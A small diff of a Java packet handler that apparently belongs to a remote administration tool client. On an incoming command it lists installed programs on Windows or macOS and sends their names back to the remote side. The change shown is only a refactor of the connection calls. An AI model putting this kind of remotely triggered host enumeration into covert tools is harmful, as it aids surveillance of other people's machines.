@@ -14,7 +14,7 @@ public class Packet81InstalledPrograms extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String path = Connection.readLine();
+		String path = Connection.instance.readLine();
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Process p;
@@ -33,13 +33,13 @@ public class Packet81InstalledPrograms extends AbstractIncomingPacket {
 						if (line.startsWith("DisplayName")) {
 							String str = line.split("    ")[2];
 							if (!str.startsWith("@")) {
-								Connection.addToSendQueue(new Packet55InstalledProgram(str));
+								Connection.instance.addToSendQueue(new Packet55InstalledProgram(str));
 							}
 						}
 					} else {
 						if (line.lastIndexOf("\\") != -1) {
 							String str = line.substring(line.lastIndexOf("\\") + 1, line.length());
-							Connection.addToSendQueue(new Packet55InstalledProgram(str));
+							Connection.instance.addToSendQueue(new Packet55InstalledProgram(str));
 						}
 					}
 				}
@@ -52,7 +52,7 @@ public class Packet81InstalledPrograms extends AbstractIncomingPacket {
 
 					if (name.contains(".app")) {
 						name = name.replace(".app", "");
-						Connection.addToSendQueue(new Packet55InstalledProgram(name));
+						Connection.instance.addToSendQueue(new Packet55InstalledProgram(name));
 					}
 				}
 			}
